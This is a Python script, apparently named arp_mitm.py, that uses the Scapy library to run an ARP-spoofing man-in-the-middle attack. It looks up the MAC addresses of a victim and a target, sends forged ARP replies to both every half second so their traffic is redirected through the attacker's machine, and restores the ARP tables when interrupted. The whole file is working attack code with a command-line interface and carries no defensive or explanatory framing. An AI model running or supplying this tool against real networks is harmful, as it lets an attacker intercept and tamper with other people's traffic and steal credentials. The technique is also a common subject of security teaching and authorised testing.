import scapy.all as scapy
import sys
import time

class ArpMitm():
    
    @staticmethod
    def get_mac(ip, iface):
      try:
         arp_req = scapy.ARP(op=1, pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_req_broadcast = broadcast / arp_req
         answered_list = scapy.srp(arp_req_broadcast, timeout=3, verbose=False, iface=iface)[0]
         return answered_list[0][1].hwsrc
      except IndexError:
         raise Exception(f"Could not find MAC address for IP: {ip}")

    @staticmethod
    def spoof(victim_ip, target_ip, victim_mac=None, target_mac=None, iface=None):
        iface = iface or scapy.conf.iface
        try:
         arp_reply_victim = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
         arp_reply_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip)
         scapy.sendp(scapy.Ether(dst=victim_mac) / arp_reply_victim, iface=iface, verbose=False)
         scapy.sendp(scapy.Ether(dst=target_mac) / arp_reply_target, iface=iface, verbose=False)
        except Exception as e:
            print(f"Error in spoofing: {e}")

    @staticmethod
    def restore(victim_ip, target_ip, victim_mac, target_mac, iface=None):
        iface = iface or scapy.conf.iface
        try:
            restore_victim = scapy.ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac)
            restore_target = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim_ip, hwsrc=victim_mac)
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / restore_victim, iface=iface, verbose=False)
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / restore_target, iface=iface, verbose=False)
        except Exception as e:
            print(f"Error in restoring ARP tables: {e}")


def main():
  if len(sys.argv) < 5:
    print("Usage: python3 arp_mitm.py <victim_ip> <target_ip> [victim_mac] [target_mac] [iface]")
    print("Options:")
    print("  <victim_mac>  : Optional. MAC address of the victim. If not provided or set to 'none', will be determined using ARP.")
    print("  <target_mac>  : Optional. MAC address of the target. If not provided or set to 'none', will be determined using ARP.")
    print("    [iface]     : Optional. Network interface to use. If not provided, default interface will be used.")
    sys.exit(1)
    
  victim_ip = sys.argv[1]
  target_ip = sys.argv[2]
  victim_mac = sys.argv[3] if sys.argv[3].lower() != "none" else None
  target_mac = sys.argv[4] if sys.argv[4].lower() != "none" else None
  iface = sys.argv[5] if len(sys.argv) > 5 else None
  while True:
    try:
      if victim_mac is None or target_mac is None:
        if victim_mac is None:
            victim_mac = ArpMitm.get_mac(victim_ip, iface)
        if target_mac is None:
            target_mac = ArpMitm.get_mac(target_ip, iface)
      ArpMitm.spoof(victim_ip, target_ip, victim_mac, target_mac, iface)
      time.sleep(0.5)
    except KeyboardInterrupt:
        ArpMitm.restore(victim_ip, target_ip, victim_mac, target_mac, iface)
        break

if __name__ == "__main__":
  main()

